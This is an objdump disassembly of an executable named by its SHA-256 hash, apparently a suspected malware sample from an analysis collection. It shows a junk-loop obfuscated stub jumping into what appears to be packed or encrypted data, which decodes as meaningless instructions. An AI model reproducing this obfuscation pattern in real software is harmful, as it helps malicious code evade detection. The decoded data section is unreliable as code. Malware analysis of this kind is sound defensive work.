
38b609b2d8e987f5a30348d904be9100d6d1f00df1fa83ef25a838deebc757fd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x80
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	mov    ecx,DWORD PTR ds:0x428657
  401012:	and    DWORD PTR ds:0x428647,ecx
  401018:	push   ebx
  401019:	movzx  ecx,BYTE PTR ds:0x42862f
  401020:	add    DWORD PTR ds:0x4285cf,ecx
  401026:	push   esi
  401027:	and    DWORD PTR ds:0x42867b,0x0
  401031:	jmp    0x401043
  401036:	mov    esi,DWORD PTR ds:0x42867b
  40103c:	inc    esi
  40103d:	mov    DWORD PTR ds:0x42867b,esi
  401043:	cmp    DWORD PTR ds:0x42867b,0x17
  40104a:	jae    0x401084
  401050:	cmp    DWORD PTR ds:0x42867b,0x24
  401057:	jb     0x401084
  40105d:	jmp    0x40107f
  401062:	push   0x312f
  401067:	push   0x3b66
  40106c:	push   0x8bcc
  401071:	push   DWORD PTR [ebp-0x14]
  401074:	push   0x61c9
  401079:	call   DWORD PTR ds:0x42879f
  40107f:	jmp    0x401036
  401084:	push   edi
  401085:	and    DWORD PTR ds:0x4285e3,0x0
  40108f:	mov    esi,DWORD PTR ds:0x4285e3
  401095:	inc    esi
  401096:	mov    DWORD PTR ds:0x4285e3,esi
  40109c:	cmp    DWORD PTR ds:0x4285e3,0x20
  4010a3:	jbe    0x4010c4
  4010a9:	jmp    0x4010b7
  4010ae:	push   DWORD PTR [ebp-0x18]
  4010b1:	call   DWORD PTR ds:0x4287a3
  4010b7:	cmp    DWORD PTR ds:0x4285e3,0x1f
  4010be:	jb     0x40108f
  4010c4:	mov    esi,0x75108a4
  4010c9:	inc    ecx
  4010ca:	xor    eax,esi
  4010cc:	mov    edi,0x3272ec
  4010d1:	add    eax,edi
  4010d3:	mov    DWORD PTR [ebp-0x28],eax
  4010d6:	and    eax,eax
  4010d8:	mov    eax,ds:0x42816f
  4010dd:	xor    ecx,DWORD PTR ds:0x4285cf
  4010e3:	mov    eax,DWORD PTR [eax]
  4010e5:	sub    DWORD PTR ds:0x42861b,ecx
  4010eb:	mov    DWORD PTR [ebp-0x20],eax
  4010ee:	adc    DWORD PTR ds:0x42862b,edi
  4010f4:	mov    eax,ds:0x428377
  4010f9:	xor    DWORD PTR ds:0x428603,ebx
  4010ff:	mov    eax,DWORD PTR [eax]
  401101:	neg    ecx
  401103:	mov    DWORD PTR [ebp-0x18],eax
  401106:	sbb    DWORD PTR ds:0x428643,ecx
  40110c:	mov    DWORD PTR [ebp-0x24],0xf89c87b0
  401113:	and    DWORD PTR ds:0x42866b,ecx
  401119:	mov    eax,DWORD PTR [ebp-0x24]
  40111c:	mov    ecx,DWORD PTR ds:0x4286a7
  401122:	mov    ecx,DWORD PTR [ecx]
  401124:	sbb    DWORD PTR ds:0x428633,ecx
  40112a:	xor    eax,esi
  40112c:	and    DWORD PTR ds:0x428657,0x0
  401136:	mov    ecx,DWORD PTR ds:0x428657
  40113c:	inc    ecx
  40113d:	mov    DWORD PTR ds:0x428657,ecx
  401143:	cmp    DWORD PTR ds:0x428657,0x15
  40114a:	jg     0x401170
  401150:	jmp    0x401163
  401155:	push   DWORD PTR [ebp-0x20]
  401158:	push   0x428097
  40115d:	call   DWORD PTR ds:0x4287a7
  401163:	cmp    DWORD PTR ds:0x428657,0x13
  40116a:	jb     0x401136
  401170:	add    eax,edi
  401172:	mov    DWORD PTR [ebp-0x28],eax
  401175:	adc    DWORD PTR ds:0x428603,0x6a9
  40117f:	mov    eax,ds:0x4282ef
  401184:	sub    ecx,DWORD PTR ds:0x428647
  40118a:	mov    DWORD PTR [ebp-0x28],eax
  40118d:	mov    DWORD PTR ds:0x4285eb,0x1e
  401197:	cmp    DWORD PTR ds:0x4285eb,0x0
  40119e:	je     0x4011d9
  4011a4:	cmp    DWORD PTR ds:0x4285eb,0x2b
  4011ab:	jg     0x4011d9
  4011b1:	jmp    0x4011c7
  4011b6:	push   0x4280ae
  4011bb:	push   DWORD PTR [ebp-0x18]
  4011be:	push   DWORD PTR [ebp-0xc]
  4011c1:	call   DWORD PTR ds:0x4287ab
  4011c7:	mov    ecx,DWORD PTR ds:0x4285eb
  4011cd:	dec    ecx
  4011ce:	mov    DWORD PTR ds:0x4285eb,ecx
  4011d4:	jmp    0x401197
  4011d9:	mov    eax,DWORD PTR [ebp-0x20]
  4011dc:	mov    DWORD PTR ds:0x4285db,0x1c
  4011e6:	cmp    DWORD PTR ds:0x4285db,0x0
  4011ed:	je     0x401222
  4011f3:	cmp    DWORD PTR ds:0x4285db,0x28
  4011fa:	jbe    0x401222
  401200:	jmp    0x401210
  401205:	push   0x428042
  40120a:	call   DWORD PTR ds:0x4287af
  401210:	mov    ecx,DWORD PTR ds:0x4285db
  401216:	dec    ecx
  401217:	mov    DWORD PTR ds:0x4285db,ecx
  40121d:	jmp    0x4011e6
  401222:	mov    DWORD PTR [ebp-0x10],eax
  401225:	and    DWORD PTR ds:0x428627,0x0
  40122f:	jmp    0x40123f
  401234:	mov    eax,ds:0x428627
  401239:	inc    eax
  40123a:	mov    ds:0x428627,eax
  40123f:	cmp    DWORD PTR ds:0x428627,0x1e
  401246:	jae    0x40128e
  40124c:	cmp    DWORD PTR ds:0x428627,0xa
  401253:	jge    0x40128e
  401259:	jmp    0x40126e
  40125e:	push   0x6cd8
  401263:	push   0x4285eb
  401268:	call   DWORD PTR ds:0x4287b3
  40126e:	cmp    DWORD PTR ds:0x428627,0x9
  401275:	jne    0x401289
  40127b:	xor    eax,eax
  40127d:	add    eax,DWORD PTR ds:0x428627
  401283:	inc    eax
  401284:	mov    ds:0x428627,eax
  401289:	jmp    0x401234
  40128e:	mov    eax,DWORD PTR [ebp-0x10]
  401291:	and    DWORD PTR ds:0x4285ff,0x0
  40129b:	mov    ecx,DWORD PTR ds:0x4285ff
  4012a1:	inc    ecx
  4012a2:	mov    DWORD PTR ds:0x4285ff,ecx
  4012a8:	cmp    DWORD PTR ds:0x4285ff,0x5
  4012af:	jl     0x4012e7
  4012b5:	jmp    0x4012c0
  4012ba:	call   DWORD PTR ds:0x4287b7
  4012c0:	cmp    DWORD PTR ds:0x4285ff,0x4
  4012c7:	jne    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x4285ff
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x4285ff,ecx
  4012da:	cmp    DWORD PTR ds:0x4285ff,0x18
  4012e1:	jb     0x40129b
  4012e7:	push   0x4
  4012e9:	xor    ecx,ecx
  4012eb:	or     ecx,DWORD PTR ds:0x42864b
  4012f1:	sub    DWORD PTR ds:0x4285d3,ecx
  4012f7:	pop    ecx
  4012f8:	or     DWORD PTR ds:0x4285eb,0x6baf
  401302:	sub    ecx,eax
  401304:	and    DWORD PTR ds:0x4285ff,0x0
  40130e:	mov    eax,ds:0x4285ff
  401313:	inc    eax
  401314:	mov    ds:0x4285ff,eax
  401319:	cmp    DWORD PTR ds:0x4285ff,0x1c
  401320:	jg     0x401343
  401326:	jmp    0x401336
  40132b:	push   0x6245
  401330:	call   DWORD PTR ds:0x4287bb
  401336:	cmp    DWORD PTR ds:0x4285ff,0x17
  40133d:	jb     0x40130e
  401343:	add    ecx,DWORD PTR [ebp-0x18]
  401346:	sub    DWORD PTR ds:0x42867b,ecx
  40134c:	mov    DWORD PTR [ebp-0xc],0xf89c85f0
  401353:	mov    DWORD PTR [ebp-0x14],ecx
  401356:	mov    DWORD PTR [ebp-0x80],0xf89c85bc
  40135d:	adc    eax,0x2a9e
  401362:	mov    eax,DWORD PTR [ebp-0x10]
  401365:	mov    DWORD PTR [ebp-0x7c],eax
  401368:	and    DWORD PTR ds:0x42865b,0x0
  401372:	jmp    0x401382
  401377:	mov    eax,ds:0x42865b
  40137c:	inc    eax
  40137d:	mov    ds:0x42865b,eax
  401382:	cmp    DWORD PTR ds:0x42865b,0x14
  401389:	jae    0x4013e1
  40138f:	cmp    DWORD PTR ds:0x42865b,0xd
  401396:	jle    0x4013e1
  40139c:	jmp    0x4013c1
  4013a1:	push   0x5c8c
  4013a6:	push   0x42800b
  4013ab:	push   DWORD PTR [ebp-0x18]
  4013ae:	push   0x42800b
  4013b3:	push   0x513b
  4013b8:	push   DWORD PTR [ebp-0xc]
  4013bb:	call   DWORD PTR ds:0x4287bf
  4013c1:	cmp    DWORD PTR ds:0x42865b,0xc
  4013c8:	jne    0x4013dc
  4013ce:	xor    eax,eax
  4013d0:	add    eax,DWORD PTR ds:0x42865b
  4013d6:	inc    eax
  4013d7:	mov    ds:0x42865b,eax
  4013dc:	jmp    0x401377
  4013e1:	mov    eax,DWORD PTR [ebp-0x14]
  4013e4:	adc    DWORD PTR ds:0x42860f,0x676
  4013ee:	mov    DWORD PTR [ebp-0x78],eax
  4013f1:	mov    eax,DWORD PTR [ebp-0xc]
  4013f4:	sbb    DWORD PTR ds:0x4285db,0x428663
  4013fe:	xor    eax,esi
  401400:	add    eax,edi
  401402:	mov    DWORD PTR [ebp-0x74],eax
  401405:	lea    eax,[ebp-0x1c]
  401408:	mov    DWORD PTR [ebp-0x70],eax
  40140b:	mov    eax,DWORD PTR [ebp-0x80]
  40140e:	jmp    0x4037cc
  401413:	mov    eax,0x80deee36
  401418:	xchg   BYTE PTR [eax-0x320ea8e8],bh
  40141e:	pop    ebx
  40141f:	icebp  
  401420:	out    dx,eax
  401421:	inc    esp
  401422:	je     0x40149e
  401424:	jp     0x4014a0
  401426:	jp     0x401405
  401428:	pop    edi
  401429:	jp     0x4014a5
  40142b:	and    eax,0x1931272c
  401430:	xor    eax,0x42752f1b
  401435:	imul   esi,DWORD PTR [esi+0x32],0x6d6a6a7f
  40143c:	inc    edx
  40143d:	aad    0xdc
  40143f:	icebp  
  401440:	pusha  
  401441:	dec    eax
  401442:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffa0
  401446:	jo     0x4014b5
  401448:	pop    ecx
  401449:	iret   
  40144a:	pop    ebp
  40144b:	dec    edx
  40144c:	xor    BYTE PTR [edx+edi*8+0x4d678697],cl
  401453:	jg     0x40149c
  401455:	xor    BYTE PTR [esi+0x3bb2b07f],0x2c
  40145c:	push   DWORD PTR [esi-0x24]
  40145f:	cli    
  401460:	arpl   WORD PTR [edi+0x1e],di
  401463:	in     eax,dx
  401464:	cmp    ebp,ecx
  401466:	mov    edx,0xde2397ed
  40146b:	mov    ebp,DWORD PTR [ecx]
  40146d:	mulps  xmm5,XMMWORD PTR [ebx+0x6d07d48a]
  401474:	fst    QWORD PTR [esp+eiz*8]
  401477:	push   cs
  401478:	cli    
  401479:	sbb    BYTE PTR ss:[eax+0xc],cl
  40147d:	imul   ebp,DWORD PTR ss:[eax-0x47],0xffffffaf
  401482:	and    edx,DWORD PTR [ecx+0x15]
  401485:	mov    dh,0xff
  401487:	jmp    0x42c43fd5
  40148c:	enter  0xf95b,0x1a
  401490:	cli    
  401491:	js     0x401444
  401493:	jae    0x401472
  401495:	cwde   
  401496:	pop    edi
  401497:	mov    esi,DWORD PTR [ecx+0x41922417]
  40149d:	add    ebx,DWORD PTR [esi+0xb83823c]
  4014a3:	fisubr DWORD PTR ds:0x43448d62
  4014a9:	fs repz iret 
  4014ac:	mov    ch,BYTE PTR [ecx]
  4014ae:	mov    eax,eax
  4014b0:	(bad)  
  4014b1:	int3   
  4014b2:	mov    BYTE PTR [ecx-0xc],ah
  4014b5:	push   ebp
  4014b6:	bound  ecx,QWORD PTR [esp+ecx*1+0x3e]
  4014ba:	add    eax,DWORD PTR [esi+0x13]
  4014bd:	lods   eax,DWORD PTR ds:[esi]
  4014be:	dec    ebx
  4014bf:	retf   0x40b7
  4014c2:	rcl    BYTE PTR [esi+eiz*2],1
  4014c5:	std    
  4014c6:	bound  esp,QWORD PTR [esi-0x4b]
  4014c9:	stc    
  4014ca:	push   0x1852f8bf
  4014cf:	test   DWORD PTR [esi+esi*2-0x17e398d8],ebx
  4014d6:	fld    st(0)
  4014d8:	or     eax,DWORD PTR [edx+0x50]
  4014db:	dec    eax
  4014dc:	mov    bh,0xfb
  4014de:	jl     0x401559
  4014e0:	fild   WORD PTR [edi+0x1]
  4014e3:	adc    ecx,edi
  4014e5:	mov    al,0xcd
  4014e7:	mov    eax,ds:0xfa383ff4
  4014ec:	dec    edi
  4014ed:	dec    esi
  4014ee:	in     al,0x72
  4014f0:	bound  ebx,QWORD PTR [edi-0x58]
  4014f3:	jae    0x4014a5
  4014f5:	mov    fs,ebx
  4014f7:	dec    ecx
  4014f8:	lock pop ds
  4014fa:	dec    edi
  4014fb:	dec    ebx
  4014fc:	mov    eax,0x347579d2
  401501:	inc    ebp
  401502:	add    BYTE PTR [edi-0x77354a81],cl
  401508:	pop    eax
  401509:	jg     0x4014f4
  40150b:	cmc    
  40150c:	fwait
  40150d:	push   edx
  40150e:	cwde   
  40150f:	test   BYTE PTR [edx-0x9cfd579],0x49
  401516:	out    dx,eax
  401517:	sti    
  401518:	dec    edi
  401519:	xor    ebp,esi
  40151b:	bound  eax,QWORD PTR [ecx-0xda8661f]
  401521:	mov    WORD PTR [edi],?
  401523:	out    dx,eax
  401524:	xchg   edi,eax
  401525:	push   cs
  401526:	push   ebp
  401527:	push   ss
  401528:	mov    fs,WORD PTR ds:[esi]
  40152b:	mov    bl,0x1f
  40152d:	and    ecx,DWORD PTR [ecx]
  40152f:	mov    cl,0xb0
  401531:	imul   edx,DWORD PTR [edx+0x148be28f],0x55
  401538:	std    
  401539:	sbb    esi,DWORD PTR [edi+ebx*4+0x7f]
  40153d:	mov    edx,0xe46232d6
  401542:	push   ecx
  401543:	loop   0x4015a6
  401545:	data16 (bad) 
  401548:	setae  BYTE PTR cs:[edx+0x1b7d8558]
  401550:	pusha  
  401551:	test   eax,0xa374c1b3
  401556:	gs (bad) 
  401558:	push   edi
  401559:	pop    ds
  40155a:	sbb    al,0xe6
  40155c:	lds    ecx,FWORD PTR [edi]
  40155e:	xchg   esp,eax
  40155f:	push   ebx
  401560:	popa   
  401561:	cmp    dl,BYTE PTR [edi-0x1c]
  401564:	jno    0x4014e6
  401566:	sahf   
  401567:	icebp  
  401568:	mov    al,0xdc
  40156a:	lahf   
  40156b:	jg     0x4015ae
  40156d:	sub    al,0xbe
  40156f:	or     ah,BYTE PTR [eax]
  401571:	repnz xor DWORD PTR ss:0x8bcd2e67,edx
  401579:	ds add al,0xbd
  40157c:	mov    cl,BYTE PTR [edi-0x22]
  40157f:	or     BYTE PTR [edx-0x1df71ef0],0xc3
  401586:	mov    esi,ds
  401588:	test   eax,0xa0cd74a4
  40158d:	add    dh,BYTE PTR fs:[ecx]
  401590:	pop    es
  401591:	cmp    BYTE PTR [esi+0x40f59de8],cl
  401597:	jmp    0x4015ca
  401599:	mov    ds:0xd2e87036,eax
  40159e:	jg     0x401593
  4015a0:	push   eax
  4015a1:	shl    ah,1
  4015a3:	jae    0x4015cb
  4015a5:	xor    BYTE PTR [edx],dh
  4015a7:	test   al,0x2
  4015a9:	stos   DWORD PTR es:[edi],eax
  4015aa:	mov    ds:0x22b63633,al
  4015af:	out    0xad,eax
  4015b1:	fwait
  4015b2:	xlat   BYTE PTR gs:[ebx]
  4015b4:	add    DWORD PTR [ebx-0x54],esp
  4015b7:	imul   edi,ebp,0x8ad0fa1d
  4015bd:	ret    
  4015be:	(bad)  
  4015bf:	mov    edx,0xda3af2e4
  4015c4:	loop   0x401617
  4015c6:	loopne 0x4015b6
  4015c8:	sub    BYTE PTR [eax],al
  4015ca:	sub    eax,0x507fc9ba
  4015cf:	popa   
  4015d0:	mov    edi,0xca1f6945
  4015d5:	test   eax,0x79f36d6a
  4015da:	aad    0xe1
  4015dc:	add    esi,edx
  4015de:	pop    eax
  4015df:	push   ebp
  4015e0:	ins    BYTE PTR es:[edi],dx
  4015e1:	loope  0x401594
  4015e3:	fwait
  4015e4:	push   esp
  4015e5:	adc    bh,al
  4015e7:	xor    BYTE PTR [eax+0x5b],bh
  4015ea:	jno    0x4015c3
  4015ec:	int3   
  4015ed:	or     edx,DWORD PTR [esi+0x190a9bb4]
  4015f3:	(bad)  
  4015f5:	adc    DWORD PTR [edi],esp
  4015f7:	mov    ds:0x7bcfac9f,al
  4015fc:	sahf   
  4015fd:	(bad)  
  4015fe:	mov    bl,0x4b
  401600:	popa   
  401601:	lds    ecx,FWORD PTR [ecx+ebp*8-0x46]
  401605:	jnp    0x4015c3
  401607:	inc    esi
  401608:	fist   WORD PTR [edx]
  40160a:	or     BYTE PTR [ebx-0x49],ah
  40160d:	mov    ebp,0x621ec226
  401612:	push   cs
  401613:	jle    0x40160e
  401615:	(bad)  
  401616:	sub    al,0xeb
  401618:	jb     0x4015dc
  40161a:	fs mov cl,ah
  40161d:	jae    0x4015e5
  40161f:	xchg   DWORD PTR [eax-0xa],ebx
  401622:	jp     0x401641
  401624:	push   eax
  401625:	xchg   ebp,eax
  401626:	jne    0x401682
  401628:	scas   al,BYTE PTR es:[edi]
  401629:	xlat   BYTE PTR ds:[ebx]
  40162a:	cmp    eax,ebp
  40162c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40162d:	ror    BYTE PTR [esp+ebx*1],1
  401630:	sbb    bl,ah
  401632:	out    dx,al
  401633:	jnp    0x40166f
  401635:	push   esi
  401636:	dec    ebp
  401637:	xor    al,0x74
  401639:	fidivr WORD PTR [esi]
  40163b:	aam    0x8a
  40163d:	arpl   WORD PTR [ebx+0x54],si
  401640:	nop
  401641:	ins    DWORD PTR es:[edi],dx
  401642:	xchg   edi,eax
  401643:	dec    esp
  401644:	ret    0x508
  401647:	xchg   esp,eax
  401648:	push   esi
  401649:	ss ins DWORD PTR es:[edi],dx
  40164b:	and    al,0x1f
  40164d:	push   ds
  40164e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40164f:	test   eax,0x2cfd78f7
  401654:	stos   DWORD PTR es:[edi],eax
  401655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401656:	cmovge esi,esi
  401659:	xchg   BYTE PTR [eax],bl
  40165b:	retf   0xdf7e
  40165e:	shl    BYTE PTR [ebx+0xfb39941],0xb0
  401665:	ss inc esp
  401667:	gs jb  0x40161a
  40166a:	dec    edx
  40166b:	(bad)  
  40166c:	mov    ebx,0x34a3483b
  401671:	pop    esi
  401672:	xchg   esi,eax
  401673:	mov    dl,0x9a
  401675:	lea    esi,[edx]
  401677:	fs popf 
  401679:	in     al,0x5c
  40167b:	add    al,0x26
  40167d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40167e:	and    DWORD PTR [ecx-0x56],ebx
  401681:	mov    bh,0x44
  401683:	call   0x1996308
  401688:	mov    dl,0xbc
  40168a:	mov    ecx,0x60826047
  40168f:	cld    
  401690:	add    BYTE PTR [edi],al
  401692:	add    DWORD PTR [edi],eax
  401694:	out    0xeb,eax
  401696:	or     dl,BYTE PTR [esi]
  401698:	les    ecx,FWORD PTR [esi+edi*1-0x13]
  40169c:	dec    esp
  40169d:	(bad)  
  40169f:	fcmovnu st,st(5)
  4016a1:	gs sbb bl,0xe9
  4016a5:	dec    esp
  4016a6:	mov    eax,0x84a4a1d8
  4016ab:	das    
  4016ac:	scas   al,BYTE PTR es:[edi]
  4016ad:	fs push ecx
  4016af:	jge    0x40171d
  4016b1:	push   edx
  4016b2:	mov    DWORD PTR [ebx-0x19ba7bea],ebx
  4016b8:	out    0x38,eax
  4016ba:	(bad)  
  4016bb:	test   DWORD PTR [ebx],0xe35d51f0
  4016c1:	ss mov al,0x1a
  4016c4:	mov    ds:0x6e1c0790,al
  4016c9:	iret   
  4016ca:	add    DWORD PTR [ecx+eiz*2+0x7e554316],ebx
  4016d1:	xchg   ecx,eax
  4016d2:	pop    ds
  4016d3:	imul   esi,DWORD PTR [ebx],0x3094dbd0
  4016d9:	mov    ebp,0x70a5e01d
  4016de:	fs gs pushf 
  4016e1:	jns    0x4016df
  4016e3:	test   eax,0x8c2013bc
  4016e9:	cld    
  4016ea:	retf   
  4016eb:	add    eax,0x58a5ea64
  4016f0:	xchg   ebx,eax
  4016f1:	push   edi
  4016f2:	xlat   BYTE PTR ds:[ebx]
  4016f3:	retf   
  4016f4:	gs jmp 0xaebeb620
  4016fa:	jle    0x40174e
  4016fc:	cli    
  4016fd:	fmul   QWORD PTR [ebx+edi*8]
  401700:	(bad)  
  401702:	retf   
  401703:	int3   
  401704:	push   es
  401705:	mov    WORD PTR [esi-0x4c],?
  401708:	mov    ah,0x67
  40170a:	call   0x7ce5:0x7b5eca6c
  401711:	xchg   esi,eax
  401712:	pop    es
  401713:	pusha  
  401714:	jg     0x4016d1
  401716:	pop    ds
  401717:	cs cwde 
  401719:	inc    ecx
  40171a:	cmp    ecx,DWORD PTR cs:[edi-0x2280bb19]
  401721:	(bad)  
  401722:	test   dh,bl
  401724:	pop    eax
  401725:	push   edx
  401726:	mov    al,ds:0x93de4e3
  40172b:	push   ds
  40172c:	ficom  WORD PTR [edi+0x477ed845]
  401732:	xchg   edx,eax
  401733:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  401735:	ret    
  401736:	adc    al,0x30
  401738:	fist   WORD PTR [esi-0x5f]
  40173b:	or     ch,bl
  40173d:	jecxz  0x40170a
  40173f:	xchg   esp,eax
  401740:	xchg   edx,eax
  401741:	in     al,dx
  401742:	mov    al,0x97
  401744:	idiv   esi
  401746:	xor    ebp,DWORD PTR [edx]
  401748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401749:	xor    DWORD PTR fs:[eax],ebx
  40174c:	lahf   
  40174d:	mov    ch,0xc9
  40174f:	push   es
  401750:	push   ss
  401751:	xchg   esp,eax
  401752:	mov    ah,0xd
  401754:	sti    
  401755:	push   es
  401756:	pop    ds
  401757:	fadd   QWORD PTR [ecx-0x6d]
  40175a:	jg     0x40172a
  40175c:	dec    edx
  40175d:	sub    cl,bl
  40175f:	sub    cl,al
  401761:	(bad)  
  401762:	mov    cl,0xdb
  401764:	and    al,0xec
  401766:	pop    esp
  401767:	adc    al,0x58
  401769:	adc    al,0xb0
  40176b:	jmp    0x7a45:0xa6d06b1e
  401772:	mov    ebp,0x40c617bd
  401777:	xor    eax,0xb494137d
  40177c:	dec    ecx
  40177d:	sub    BYTE PTR [edx+0x277f3a72],0x6d
  401784:	pop    ds
  401785:	sbb    eax,0x9a0a347c
  40178a:	cmp    eax,0x6c20dbcd
  40178f:	jmp    0x88cc:0xe44d5484
  401796:	add    eax,0xae4d84e2
  40179b:	mov    edx,0x89852644
  4017a0:	sbb    al,BYTE PTR [edi-0x331907b7]
  4017a6:	es dec eax
  4017a8:	mov    al,0xb3
  4017aa:	loope  0x401814
  4017ac:	add    al,0xcc
  4017ae:	mov    edx,0x9c1a1192
  4017b3:	xchg   BYTE PTR [esi+0x1c1cb45f],ch
  4017b9:	sbb    eax,0x3ba20db1
  4017be:	adc    edi,esi
  4017c0:	enter  0xae85,0x57
  4017c4:	ja     0x4017ef
  4017c6:	fiadd  WORD PTR [esi]
  4017c8:	jle    0x4017d5
  4017ca:	pop    esp
  4017cb:	scas   al,BYTE PTR es:[edi]
  4017cc:	or     al,0x14
  4017ce:	xor    BYTE PTR [eax+0x35],bh
  4017d1:	push   0xffffffd1
  4017d3:	ins    DWORD PTR es:[edi],dx
  4017d4:	fistp  QWORD PTR [ebx+0x24]
  4017d7:	test   ch,bl
  4017d9:	adc    bh,ah
  4017db:	and    DWORD PTR [edx-0x74],esp
  4017de:	(bad)  
  4017df:	jle    0x401785
  4017e1:	dec    ecx
  4017e2:	dec    edi
  4017e3:	jecxz  0x401840
  4017e5:	sbb    ah,0xde
  4017e8:	xor    al,0xf
  4017ea:	or     al,0xc7
  4017ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ed:	pop    ecx
  4017ee:	dec    edi
  4017ef:	jl     0x401830
  4017f1:	(bad)  
  4017f2:	scas   eax,DWORD PTR es:[edi]
  4017f3:	sbb    BYTE PTR [edx],dl
  4017f5:	and    eax,0x9d8b20dd
  4017fa:	xchg   esp,eax
  4017fb:	test   BYTE PTR [edi+0x60],dh
  4017fe:	jg     0x4017a1
  401800:	(bad)  
  401801:	rcr    ebx,cl
  401803:	pop    esp
  401804:	inc    ecx
  401805:	mov    bl,0xae
  401807:	xchg   ecx,edx
  401809:	call   0xd939eaf7
  40180e:	inc    esi
  40180f:	cmp    DWORD PTR [esi+0x17],0xe1429550
  401816:	(bad)  
  401817:	xor    BYTE PTR ds:[ebx+eax*4-0x3b],bh
  40181c:	je     0x4017f3
  40181e:	shl    BYTE PTR [eax],1
  401820:	mov    BYTE PTR [esi-0xd],cl
  401823:	das    
  401824:	(bad)  
  401825:	in     eax,dx
  401826:	scas   eax,DWORD PTR es:[edi]
  401827:	mov    eax,0x35cfce26
  40182c:	imul   esp,DWORD PTR [ecx+0x3ebc00fb],0x6b
  401833:	repnz or esi,eax
  401836:	cmc    
  401837:	test   eax,0xe3c72d
  40183c:	pop    edx
  40183d:	pop    edi
  40183e:	cmp    DWORD PTR [esi],edi
  401840:	or     DWORD PTR [ecx],ebp
  401842:	mov    eax,0xe0ec5748
  401847:	lea    ecx,[esi-0x1b44ece]
  40184d:	lods   al,BYTE PTR ds:[esi]
  40184e:	xor    DWORD PTR [ebx-0x5f48aba4],eax
  401854:	out    dx,al
  401855:	call   0x65fab9fc
  40185a:	push   ds
  40185b:	add    eax,0xdf9b36ef
  401860:	pop    ecx
  401861:	loop   0x401871
  401863:	add    dl,ch
  401865:	mov    cl,0x8a
  401867:	mov    al,ds:0x2f29c747
  40186c:	xor    ah,BYTE PTR [ebp-0x65]
  40186f:	sbb    ah,BYTE PTR [esp+ecx*1+0x1fafe0c8]
  401876:	sub    DWORD PTR [edx-0x1af9703],edi
  40187c:	xchg   ebp,eax
  40187d:	lods   eax,DWORD PTR ds:[esi]
  40187e:	pop    ebp
  40187f:	or     DWORD PTR [ebx],0xfffffffb
  401882:	mov    DWORD PTR [esi],0x23205934
  401888:	adc    DWORD PTR ds:0xed17bba4,edx
  40188e:	mov    eax,ds:0x6d102de2
  401893:	leave  
  401894:	jnp    0x4018a5
  401896:	je     0x401836
  401898:	push   edx
  401899:	mul    esp
  40189b:	dec    ecx
  40189c:	xchg   ebx,eax
  40189d:	and    DWORD PTR [eax+0x7d],eax
  4018a0:	jnp    0x40187d
  4018a2:	mov    esi,0xf2533472
  4018a7:	loope  0x4018e6
  4018a9:	adc    BYTE PTR [esi-0x16],0x91
  4018ad:	cmp    DWORD PTR [ecx-0x34],ebp
  4018b0:	rol    bh,cl
  4018b2:	jae    0x401910
  4018b4:	cmp    bl,ch
  4018b6:	pop    ebp
  4018b7:	enter  0xff0e,0xce
  4018bb:	inc    ecx
  4018bc:	cli    
  4018bd:	hlt    
  4018be:	daa    
  4018bf:	jp     0x4018b3
  4018c1:	adc    eax,0xab892721
  4018c6:	jno    0x40188e
  4018c8:	add    BYTE PTR [ebx],ah
  4018ca:	cmp    ebp,DWORD PTR ds:0x825a00ac
  4018d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018d1:	push   esp
  4018d2:	imul   edi,DWORD PTR [ebp+0x3e],0x4e2f371
  4018d9:	add    eax,0x1cc02539
  4018de:	adc    DWORD PTR [esi-0x5],ebp
  4018e1:	inc    esi
  4018e2:	test   dl,bl
  4018e4:	mov    dl,0xac
  4018e6:	jo     0x401919
  4018e8:	sbb    al,0x3a
  4018ea:	jo     0x4018ab
  4018ec:	sar    DWORD PTR [ebx+0x68],cl
  4018ef:	xchg   edx,eax
  4018f0:	js     0x40194a
  4018f2:	int    0xaa
  4018f4:	pop    ecx
  4018f5:	(bad)  
  4018f6:	mov    dh,0xf
  4018f8:	sub    BYTE PTR [edx+0x66],ah
  4018fb:	ins    BYTE PTR es:[edi],dx
  4018fc:	dec    edx
  4018fd:	call   0x55e2:0x8cba5918
  401904:	mov    ds:0x46a71e77,eax
  401909:	inc    ebp
  40190a:	mov    eax,ds:0xd95ce0e3
  40190f:	and    dh,BYTE PTR [edi+0x63d16da4]
  401915:	xor    al,0x30
  401917:	adc    eax,0x598c697f
  40191c:	icebp  
  40191d:	fisttp QWORD PTR [ebp-0x3]
  401920:	push   ecx
  401921:	inc    esp
  401922:	out    0x6b,al
  401924:	test   DWORD PTR [ebx-0x6049fbef],eax
  40192a:	fnsave [edx-0x78301cc6]
  401930:	push   0x21
  401932:	pop    es
  401933:	dec    edx
  401934:	jmp    0x88c2:0x14ea0633
  40193b:	push   cs
  40193c:	pusha  
  40193d:	(bad)  
  40193e:	fimul  DWORD PTR [esi+eiz*4]
  401941:	xor    ecx,ecx
  401943:	ins    DWORD PTR es:[edi],dx
  401944:	ja     0x4018e0
  401946:	xchg   edx,eax
  401947:	jl     0x40199b
  401949:	(bad)  [ebp-0x65]
  40194c:	lods   eax,DWORD PTR ds:[esi]
  40194d:	push   eax
  40194e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40194f:	add    ch,bl
  401951:	bound  ebx,QWORD PTR [eax]
  401953:	js     0x40195f
  401955:	xor    BYTE PTR [ebp+0x50228d06],0x11
  40195c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40195d:	jbe    0x401989
  40195f:	and    eax,0xae74a53b
  401964:	(bad)  
  401965:	xor    edi,edi
  401967:	xor    al,0xcc
  401969:	or     al,0x3
  40196b:	(bad)  
  40196c:	sbb    al,0xc1
  40196e:	shl    BYTE PTR [esi+0x5d],cl
  401971:	push   cs
  401972:	cmc    
  401973:	or     DWORD PTR [ebp+0x6f],esp
